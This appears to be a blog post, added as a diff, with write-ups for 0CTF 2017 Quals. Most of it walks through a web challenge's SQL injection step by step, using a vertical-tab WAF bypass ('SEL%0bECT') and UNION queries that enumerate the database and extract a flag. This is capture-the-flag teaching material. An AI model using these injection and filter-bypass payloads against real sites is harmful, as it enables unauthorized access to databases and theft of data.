@@ -1,0 +1,65 @@
+---
+layout: post
+title: "0CTF 2017 Quals - Write-ups"
+lang: en
+categories:
+  - security
+  - writeups
+tags:
+  - security
+  - writeups
+  - ctf
+  - web
+date: 2017/03/21
+thumbnail: /images/ctf.png
+---
+## Informations
+
+### Version
+
+| By        | Version | Comment
+| ---       | ---     | ---
+| noraj     | 1.0     | Creation
+
+### CTF
+
+- **Name** : 0CTF 2017 Quals
+- **Website** : [ctf.0ops.net](https://ctf.0ops.net/)
+- **Type** : Online
+- **Format** : Jeopardy
+- **CTF Time** : [link](https://ctftime.org/event/402)
+
+## Welcome - Misc
+
+> Welcome to 0CTF 2017~
+>
+> irc: irc.freenode.net #0ctf2017
+
+`flag{Welcome_to_0CTF_2017}`
+
+## simplesqlin - Web
+
+> http://202.120.7.203
+
+The injectable request: `http://202.120.7.203/index.php?id=3`.
+
+Keywords blocked:
++ `SELECT`, `sElEcT`, `%53elect`, `sel/**/ect` (not blocked but doesn't work), `/*!%53eLEct*/`
++ `FROM`
++ `WHERE`
+
+`?id=2 order by 3` works and `?id=2 order by 4` doesn't so there is 3 columns in the actual table.
+
+Keywords blocked need to be escaped, so we need to try some WAF bypass techniques. As you can see in the previous part (*Keywords blocked*), a lot of tricks don't work but I find one that is working: `se%0blect`, injecting a character that does nothing in our context like `%0b` (vertical tab) or `%07` (bell).
+
+`?id=99999 UNION SEL%0bECT 1,2,3` 99999 is an out of range id so the `UNION` statement is executed. `2` is displayed in the `<h3></h3>`, `3` is displayed in the `<div class="main">3</div>` and `1` is displayed in the link `<a href="index.php?id=1">`.
+
+Now let's identify the databse:
++ `?id=99999 UNION SEL%0bECT 1,user(),version()`: user: `news@localhost`, version: `5.7.17-0ubuntu0.16.04.1`
++ `?id=99999 UNION SEL%0bECT 1,database(),3`: database: `news`
++ `?id=99999 UNION SEL%0bECT 1,table_name,3 FR%0bOM information_schema.tables W%0bHERE table_schema = 'news'`: table name: `flag`
++ `?id=99999 UNION SEL%0bECT 1,column_name,3 fr%0bom information_schema.columns whe%0bre table_schema='news' and table_name='flag' LIMIT 0,1 -- -`: 1st column name: `flag`
++ `?id=99999 UNION SEL%0bECT 1,column_name,3 fr%0bom information_schema.columns whe%0bre table_schema='news' and table_name='flag' LIMIT 1,1 -- -`: there is only 1 column
++ `?id=99999 UNION SEL%0bECT 1,flag,3 fr%0bom news.flag`: flag: `flag{W4f_bY_paSS_f0R_CI}`
+
+References: [1](http://sechow.com/bricks/docs/content-page-1.html) - [2](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF#SQLi)
